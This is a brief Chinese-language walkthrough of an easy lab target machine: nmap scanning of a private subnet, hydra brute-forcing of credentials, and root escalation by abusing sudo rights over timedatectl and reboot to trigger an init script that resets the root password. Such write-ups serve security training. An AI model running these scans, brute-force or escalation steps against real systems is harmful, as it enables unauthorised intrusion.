
## 靶机信息
- 级别:容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.149

sudo nmap --min-rate 10000 -sT -p- 192.168.1.149 -oA tcp_scan/ports
//Ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

sudo nmap -sT -sC -sV -O -p 21,80 192.168.1.149 -oA tcp_scan/details
```

80端口访问有问题，将文件下载并作为user和passwd，hydra爆破即可

## 提权
```shell
sudo -l
    (ALL) NOPASSWD: /usr/bin/timedatectl
    (ALL) NOPASSWD: /sbin/reboot
查看/etc/init.d下的password-policy.sh文件

if [ "$DAYOFWEEK" -eq 4 ]
then
        sudo sh -c 'echo root:TodayIsAgoodDay | chpasswd'
fi



#if [ "$DAYOFWEEK" == 4 ] 
sudo timedatectl set-time '2023-10-12'(这天是一周的第四天)
sudo /sbin/reboot 
靶机重启完毕后以broken用户ssh登录
su //passwd:TodayIsAgoodDay
//成功提权
```